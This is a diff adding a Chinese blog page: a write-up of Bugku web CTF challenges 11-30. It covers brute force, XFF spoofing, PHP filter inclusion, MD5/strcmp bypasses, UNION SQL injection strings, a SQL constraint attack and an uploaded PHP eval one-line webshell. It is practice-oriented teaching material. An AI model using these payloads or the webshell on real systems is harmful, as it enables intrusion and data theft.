@@ -1,0 +1,469 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>bugku web11-30 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web11-网站被黑了,黑客会不会留下后门
+解法一：御剑
+
+在下面可以选择扫描线程以及扫描超时间，还有文件类型等
+
+
+解法二：burp的Dashboard模块
+
+主要分为三块：
+Tasks：任务
+E,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">bugku web11-30</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">bugku web11-30</h1>
+        <div class="stuff">
+            <span>二月 21, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/bugku%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/" rel="tag">bugku刷题之旅</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h4 id="web11-网站被黑了-黑客会不会留下后门"><a href="#web11-网站被黑了-黑客会不会留下后门" class="headerlink" title="web11-网站被黑了,黑客会不会留下后门"></a><strong>web11-网站被黑了,黑客会不会留下后门</strong></h4><ul>
+<li>解法一：御剑</li>
+</ul>
+<p>在下面可以选择扫描线程以及扫描超时间，还有文件类型等</p>
+<p><img src="1.png" alt="1"></p>
+<ul>
+<li>解法二：burp的Dashboard模块</li>
+</ul>
+<p>主要分为三块：</p>
+<p>Tasks：任务</p>
+<p>Event log：事件日志</p>
+<p>issue activity：动态发现的问题</p>
+<p>Tasks 中自带了两个模版，相当于以前版本的spider 和scanner 模块的结合体，支持自定义创建。</p>
+<ol>
+<li><p>live passive crawl from proxy(all traffic)  #（来自代理（所有流量）的被动抓取）</p>
+</li>
+<li><p>live audit from proxy(all traffic)        # （来自代理（所有流量）的实时审计）</p>
+</li>
+</ol>
+<p>Event log：这个主要是burpsuite 出现问题或异常状况查看日志用，平时一般用不到。</p>
+<p>issue activity：动态发现的问题</p>
+<p>Dashboard模块内容参考：<a target="_blank" rel="noopener" href="https://blog.51cto.com/010bjsoft/2175177">https://blog.51cto.com/010bjsoft/2175177</a></p>
+<p><img src="2.png" alt="2"></p>
+<p><img src="3.png" alt="3"></p>
+<ul>
+<li>最后找到shell.php，发现需要密码才能访问，burp抓包爆破密码，使用burp自带密码字典，得到密码为hack：</li>
+</ul>
+<p><img src="4.png" alt="4"></p>
+<p><img src="5.png" alt="5"></p>
+<h4 id="web12-本地管理员"><a href="#web12-本地管理员" class="headerlink" title="web12-本地管理员"></a><strong>web12-本地管理员</strong></h4><p>​         一开始看到登录界面是想到输入之后进行抓包爆破，同时爆破账号密码的时候又觉得这个过程好像有点漫长，就去看了一下源码，一开始看到那个注释里的base64字样还没在意，后来翻看了一下评论里的做法，还要伪造IP，联系了一下题目本地管理员，那就是伪造XFF了，然后就代理关了，尝试登陆，随便输入后登陆，发现IP被禁止访问:</p>
+<p><img src="6.png" alt="6"></p>
+<p>那么就和题目本地管理员联系上了，伪造XFF为自身IP进行访问。</p>
+<p>将源码里的base64字样进行解码，得到 test123，盲猜应该是密码，随便输入用户名和这个密码，抓包伪造IP进行用户名的爆破，这里是必须先在proxy模块伪造了IP后才能进行爆破，否则的话得不到用户名，得到admin</p>
+<p><img src="7.png" alt="7"></p>
+<p>输入用户名和密码，伪造IP，得到flag。</p>
+<p><img src="8.png" alt="8"></p>
+<h4 id="web13-看看源代码？"><a href="#web13-看看源代码？" class="headerlink" title="web13-看看源代码？"></a><strong>web13-看看源代码？</strong></h4><p><img src="9.png" alt="9"></p>
+<p>采用url解码之后根据eval函数的提示，将URL解码得到的三个字符串拼接得到的假flag提交得到真flag。</p>
+<p><img src="10.png" alt="10"></p>
+<h4 id="web14"><a href="#web14" class="headerlink" title="web14"></a><strong>web14</strong></h4><p><img src="11.png" alt="11"></p>
+<ol>
+<li>点击查看：</li>
+</ol>
+<p><img src="12.png" alt="12"></p>
+<ol start="2">
+<li>发现URL处存在参数?file=show.php，且flag可能存在于index.php里，想到文件包含漏洞以及解题常用的PHP伪协议：</li>
+</ol>
+<p><img src="13.png" alt="13"></p>
+<ol start="3">
+<li>php://input 被过滤，考虑php://filter协议：</li>
+</ol>
+<p><img src="14.png" alt="14"></p>
+<ol start="4">
+<li>进行base64的解码得到flag：</li>
+</ol>
+<p><img src="15.png" alt="15"></p>
+<h4 id="web15-好像需要密码"><a href="#web15-好像需要密码" class="headerlink" title="web15-好像需要密码"></a><strong>web15-好像需要密码</strong></h4><p>进行burp抓包，五位纯数字的密码爆破。</p>
+<p><img src="16.png" alt="16"></p>
+<h4 id="web16-备份是个好习惯"><a href="#web16-备份是个好习惯" class="headerlink" title="web16-备份是个好习惯"></a><strong>web16-备份是个好习惯</strong></h4><p>​        一看备份嘛就猜测是.bak  index.php.bak,输入发现可以下载到备份文件，打开查看代码，md5的弱比较，采用md5缺陷绕过，构造数组，也可以采用0e开头的md5相同的两组值，这里采用数组绕过，还要注意的就是代码中对key进行了过滤，考虑双写绕过：kkeyey 或者kekeyy的形式都可以，构造时一定记得是kkeyey1[]和kkeyey2[],不然就会像我一开始一样在想，这构造挺对的吧，咋没结果呢，哦~忘记1和2了。(这种错误我也真的是)</p>
+<p>评论里的做法有的使用御剑进行扫描的，这个过程有点漫长，还在等待ing。所以就盲猜了一下下。</p>
+<p><img src="17.png" alt="17"></p>
+<h4 id="web17"><a href="#web17" class="headerlink" title="web17"></a><strong>web17</strong></h4><ol>
+<li>进入页面：</li>
+</ol>
+<p><img src="18.png" alt="18"></p>
+<p>​        得到一个成绩查询单，分别查询1,2,3都能回显正常，输入4没有回显，尝试在1后输入’分号，没有回显，再输入#，回显正常，判断为SQL注入，字符类型。</p>
+<ol start="2">
+<li>查看源码，post方式提交表单，参数变量为id。</li>
+</ol>
+<p>也可以通过bp抓包得知。</p>
+<p><img src="19.png" alt="19"></p>
+<ol start="3">
+<li>进行order by  判断字段数为4，union select 得到回显位为2,3,4.进行爆破数据库，表名，字段名，字段内容，得到flag。</li>
+</ol>
+<ul>
+<li>爆数据库名：id=0’ union select 1,2,3,database()#</li>
+</ul>
+<p>得到数据库名为：skctf</p>
+<ul>
+<li>爆表名：id=0’ union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’skctf’#</li>
+</ul>
+<p>得到表名有：fl4g,sc</p>
+<ul>
+<li>爆字段名：id=0’ union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</li>
+</ul>
+<p>得到字段名：skctf_flag</p>
+<ul>
+<li>爆字段内容：id=0’ union select 1,2,3,select skctf_flag from fl4g#</li>
+</ul>
+<p><img src="20.png" alt="20"></p>
+<h4 id="web18-秋名山车神"><a href="#web18-秋名山车神" class="headerlink" title="web18-秋名山车神"></a><strong>web18-秋名山车神</strong></h4><p>多次刷新得到post提交的变量 value，而且每次要提交计算的表达式是会变化的：</p>
+<p><img src="21.png" alt="21"></p>
+<p>使用脚本运行：(网上的wp里的脚本)得到flag。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">//引入request库</span></span><br><span class="line"><span class="keyword">import</span> re 		<span class="comment">//引入re库</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;http://114.67.246.176:11510/&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">s = requests.session()  <span class="comment">//用session会话保持表达式是同一个</span></span><br><span class="line">retuen = s.get(url)</span><br><span class="line">equation = re.search(r<span class="string">&#x27;(\d+[+\-*])+(\d+)&#x27;</span>, retuen.text).group()</span><br><span class="line"></span><br><span class="line">result = eval(equation)	<span class="comment">//eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span></span><br><span class="line">key = &#123;<span class="string">&#x27;value&#x27;</span>:result&#125;</span><br><span class="line">print(s.post(url, data = key).text)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本重点还是第7行的正则，解释下</p>
+<ul>
+<li>re.search()表示从文本的第一个字符匹配到最后一个，其第一个参数为正则表达式，第二个参数是要匹配的文本</li>
+<li>r’’表示内容为原生字符串，防止被转义</li>
+<li>(\d+[+-<em>])+(\d+)：\d+ 表示匹配一个或多个数字；[+-</em>] 表示匹配一个加号或一个减号或一个乘号（注：减号在中括号内是特殊字符，要用反斜杠转义）；所以 (\d+[+-*])+ 表示匹配多个数字和运算符组成的“表达式”；最后再加上一组数字 (\d+) 即可</li>
+<li>group()返回字符串</li>
+</ul>
+<p>​    原文传送门：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43578492/article/details/101701339">https://blog.csdn.net/weixin_43578492/article/details/101701339</a></p>
+<h4 id="web19-速度要快"><a href="#web19-速度要快" class="headerlink" title="web19-速度要快"></a><strong>web19-速度要快</strong></h4><p>​      一开始是查看了一下源码发现需要用post方式上传margin变量，在消息头中发现一段base64加密的flag。双重解码后传值给margin进行上传，发现：</p>
+<p><img src="22.png" alt="22"></p>
+<p>查看wp发现其实flag是动态的，每次刷新网页都会变化，所以就用脚本进行获取flag。(脚本还是先收集下来吧.)</p>
+<p>脚本：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">url= <span class="string">&quot;http://120.24.86.145:8002/web6/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">headers = s.get(url).headers #获得消息头</span><br><span class="line"> </span><br><span class="line">str1 = base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>]) #解密消息头键名flag的键值</span><br><span class="line">str2 = base64.b64decode(repr(str1).split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]) #解密str1中flag:后的值</span><br><span class="line"> </span><br><span class="line">key = &#123;<span class="string">&#x27;margin&#x27;</span>:str2&#125; #创建一个字典类型用于传参</span><br><span class="line">flag = s.post(url,data=key) #post方法传上去</span><br><span class="line"> </span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+
+<h4 id="web20-cookie欺骗"><a href="#web20-cookie欺骗" class="headerlink" title="web20-cookie欺骗"></a><strong>web20-cookie欺骗</strong></h4><p>​    <strong>url处有一个是“a2V5cy50eHQ=”base6</strong>4解码后是“keys.txt”，line的功能是行数，这时就想看看index.php（base64后为aW5kZXgucGhwCg==）</p>
+<p>然后给file参数1,2,3……发现出现了代码。使用脚本来收集代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> requests</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">20</span>)</span>:</span></span><br><span class="line"><span class="function">	url</span>=<span class="string">&quot;http://114.67.246.176:14549/index.php?line=&#123;&#125;&amp;filename=aW5kZXgucGhw&quot;</span>.format(i)</span><br><span class="line">	ht=requests.get(url)</span><br><span class="line">	print(ht.text)</span><br></pre></td></tr></table></figure>
+
+<p>得到源码：</p>
+<p><img src="23.png" alt="23"></p>
+<p>代码审计发现只要访问key.php并且需要在http请求中，传递一个Cookies，内容为margin的键值对。</p>
+<p>使用脚本就能跑出flag。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> requests</span></span><br><span class="line"><span class="function">def <span class="title">fun</span><span class="params">(num)</span>:</span></span><br><span class="line"><span class="function">    session </span>= requests.Session()</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,<span class="string">&quot;Cache-Control&quot;</span>:<span class="string">&quot;max-age=0&quot;</span>,<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;keep-alive&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,<span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;ldo37io8vtliadt76v2bv8mf43&quot;</span>,<span class="string">&quot;margin&quot;</span>:<span class="string">&quot;margin&quot;</span>&#125;</span><br><span class="line">    paramsGet = &#123;<span class="string">&quot;line&quot;</span>:num,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;a2V5cy5waHA=&quot;</span>&#125; <span class="comment">//keys.php的base64密文</span></span><br><span class="line">    response = session.get(<span class="string">&quot;http://114.67.246.176:17939/index.php&quot;</span>, params=paramsGet, headers=headers, cookies=cookies)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">0</span>,<span class="number">30</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">fun</span><span class="params">(i)</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="web21"><a href="#web21" class="headerlink" title="web21"></a><strong>web21</strong></h4><p><img src="24.png" alt="24"></p>
+<ul>
+<li>查看源码发现有一个1p.html：</li>
+</ul>
+<p><img src="25.png" alt="25"></p>
+<ul>
+<li>直接访问的话会跳转到bugku论坛的主页，所以在此进行burp抓包后再进行1p.html的访问：</li>
+</ul>
+<p>得到一大段URL编码</p>
+<p><img src="26.png" alt="26"></p>
+<ul>
+<li>在此要进行三重解码：</li>
+</ul>
+<p>URL解码——&gt;base64解码——&gt;URL解码</p>
+<p>得到一段重要代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;if(!$_GET[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">    exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string">$b=$_GET[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos($a,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">    return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if($data==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr($b,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $flag = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    print &quot;</span>never never never give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行代码审计：</li>
+</ul>
+<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>
+<p>语法：</p>
+<p><img src="27.png" alt="27"></p>
+<ul>
+<li>相关函数：</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strrpos.asp">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p>
+<p>substr() 函数返回字符串的一部分。</p>
+<p>语法：substr(<em>string,start,length</em>)</p>
+<p>​            eregi():eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。eregi()可以特别有用的检查有效性字符串,如密码。　</p>
+<p>可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p>
+<p>如果匹配成功返回true,否则,则返回false。</p>
+<p>ereg() 有区分大小写，eregi()本函数与大小写无关。</p>
+<p><strong>eregi有两个漏洞：</strong></p>
+<p>①%00截断及遇到%00则默认为字符串的结束</p>
+<p>②当参数a为数组时它的返回值是FALSE,可以绕过ereg(‘^[0-9]+$’,$a)===substr($a,42)</p>
+<ul>
+<li><p>第 1 行：限制 URL 查询字符串中必须有非空非零变量 id</p>
+</li>
+<li><p>第 9 行：限制变量 $a 中不能含有字符 点（.）</p>
+</li>
+<li><p>第 15 行：要满足以下 5 条表达式才会爆 flag：</p>
+</li>
+<li><ul>
+<li>变量 $data 弱等于字符串 bugku is a nice plateform!</li>
+<li>变量 $id 弱等于整型数 0</li>
+<li>变量 $b 的长度大于 5</li>
+<li>字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配,变量 $b 的第一个字符弱不等于整型数 4</li>
+</ul>
+</li>
+</ul>
+<p>只有满足上述条件构造出来的payload才符合要求。</p>
+<ol>
+<li><p>要求id为非空非零且弱类型比较等于0，那么该变量只能为为空非零字符串。这里假设$id=“asd”</p>
+<p>有关 PHP 类型比较的详情可参考：<a target="_blank" rel="noopener" href="https://php.net/manual/zh/types.comparisons.php">PHP 类型比较表</a></p>
+</li>
+<li><p>关于data参数的弱类型，源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。</p>
+</li>
+</ol>
+<p>由此考虑PHP伪协议的构造。</p>
+<p>这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform! 。</p>
+<ol start="3">
+<li>源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 b 的 第 一 个 字 符 组 成 ，利用eregi()函数的00截断漏洞，我们将变量b的第一个字符设为%00，设$b=%0012345, 由此%00后面内容被截断，满足 “1114” 与 “111” 匹配。</li>
+</ol>
+<p>构造payload如下：</p>
+<p><img src="28.png" alt="28"></p>
+<p>参考原文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41333578/article/details/92759619">https://blog.csdn.net/qq_41333578/article/details/92759619</a></p>
+<h4 id="web24"><a href="#web24" class="headerlink" title="web24"></a><strong>web24</strong></h4><ul>
+<li>查看一下源码发现链接处指向code.txt，进行访问:</li>
+</ul>
+<p><img src="29.png" alt="29"></p>
+<ul>
+<li>得到简单的php代码，进行代码审计：</li>
+</ul>
+<p><img src="30.png" alt="30"></p>
+<ul>
+<li>v1和v2使用md5的弱比较，进行md5缺陷绕过，构造数组：<strong>v1[]=1&amp;v2[]=2</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line"></span><br><span class="line"> echo $flag;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>strcmp()用于比较两个字符串是否相等，这里表示如果不相等即strcmp（$v3, $flag）返回的是0，那么当它为非0的时候就输出flag。</p>
+<ul>
+<li>使用strmap()函数漏洞：strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。</li>
+</ul>
+<p>strcmp绕过：</p>
+<p>将v3构造成数组。</p>
+<p>strcmp(array,string)=null=0</p>
+<p><strong>v3[]=blag</strong></p>
+<p>构造payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1[]=<span class="number">1</span>&amp;v2[]=<span class="number">2</span>&amp;v3[]=blag</span><br></pre></td></tr></table></figure>
+
+<p><img src="31.png" alt="31"></p>
+<h4 id="we25-SQL约束攻击"><a href="#we25-SQL约束攻击" class="headerlink" title="we25-SQL约束攻击"></a><strong>we25-SQL约束攻击</strong></h4><p><img src="32.png" alt="32"></p>
+<p><strong>基础知识：基于约束的SQL注入</strong></p>
+<ol>
+<li>数据库字符串比较:在数据库对字符串进行比较时,如果两个字符的长度不一样,则会将较短的字符串末尾填充空格,使两个字符串的长度一致.</li>
+</ol>
+<p>比如这两条语句</p>
+<p>select * from admin where username=’vampire’</p>
+<p>select *from admin where username=’vampire ‘</p>
+<p>他们的查询结果是一致的.</p>
+<ol start="2">
+<li>INSERT截断: 这是数据库的另一个特性,当设计一字段时,我们都必须对其设定一个最大长度,比如CHAR(255),VARCHAR(20),但是当长度超过限制的时候,数据库就会将其截断,只保留限定的长度.<strong>(注意这里我们为什么需要insert注入:空格之后一定需要再跟一个或多个任意字符,防止程序在检查用户名是否已经存在时匹配到目标用户)</strong></li>
+</ol>
+<p><strong>利用：</strong></p>
+<p>假设已有一个用户admin ,password</p>
+<p>当我们注册新用户admin                         ’  123456时</p>
+<p>数据就会保存有</p>
+<p>admin password</p>
+<p>admin 123456</p>
+<p>此时，登录admin便可使用admin 123456</p>
+<p><strong>解题思路</strong></p>
+<ul>
+<li>发现要注册</li>
+</ul>
+<p><img src="33.png" alt="33"></p>
+<p>注册完后可以登录，但提示想要获取flag的话需要管理员身份，猜测管理员用户名为admin</p>
+<ul>
+<li>重新注册</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin                  <span class="number">1</span>   <span class="comment">//空格是为了截断，1是为了与原有的admin不冲突，不会显示已注册的提示，但是保存时则是admin</span></span><br><span class="line"> </span><br><span class="line">123456aA</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用admin        1和123456aA登录，得到flag</li>
+</ul>
+<p><img src="34.png" alt="34"></p>
+<p> 转载自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/kongzhian/article/details/112030256">https://blog.csdn.net/kongzhian/article/details/112030256</a></p>
+<h4 id="web26-google"><a href="#web26-google" class="headerlink" title="web26-google"></a><strong>web26-google</strong></h4><ul>
+<li>考察referer的伪造</li>
+</ul>
+<p><img src="35.png" alt="35"></p>
+<ul>
+<li>Referer的作用是告诉服务器请求是从哪里来的，所以只需要用BP在请求头加个Referer: <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a></li>
+</ul>
+<p><img src="36.png" alt="36"></p>
+<h4 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a><strong>xxx二手交易市场</strong></h4><p>​         一 开始进入到网站要注册的时候还以为是SQL注入漏洞，也尝试着注册后登陆抓包，但是也没有发现什么存在的注入点。查看了一些wp，是在上传头像照片的时候存在一个文件上传漏洞。</p>
+<ul>
+<li>上传头像照片，进行抓包，发现图片是转换成base64上传的，将内容换成一句话木马的base64 编码形式，修改</li>
+</ul>
+<p><img src="37.png" alt="37"></p>
+<ul>
+<li>在这里需要采用**<?php @eval($_POST['fox']);?>** 加引号的形式。</li>
+</ul>
+<p><img src="38.png" alt="38"></p>
+<ul>
+<li>在对应位置传入一句话木马，并将文件格式改为php，得到对应路径。</li>
+</ul>
+<p><img src="39.png" alt="39"></p>
+<ul>
+<li>把包修改后发出去，将在burp得到的地址在URL处整理一下。</li>
+</ul>
+<p><img src="40.png" alt="40"></p>
+<ul>
+<li>连接蚁剑，得到flag。</li>
+</ul>
+<p><img src="41.png" alt="41"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#web11-%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91%E4%BA%86-%E9%BB%91%E5%AE%A2%E4%BC%9A%E4%B8%8D%E4%BC%9A%E7%95%99%E4%B8%8B%E5%90%8E%E9%97%A8"><span class="toc-number">1.</span> <span class="toc-text">web11-网站被黑了,黑客会不会留下后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web12-%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">2.</span> <span class="toc-text">web12-本地管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web13-%E7%9C%8B%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">web13-看看源代码？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web14"><span class="toc-number">4.</span> <span class="toc-text">web14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web15-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">web15-好像需要密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web16-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="toc-number">6.</span> <span class="toc-text">web16-备份是个好习惯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web17"><span class="toc-number">7.</span> <span class="toc-text">web17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 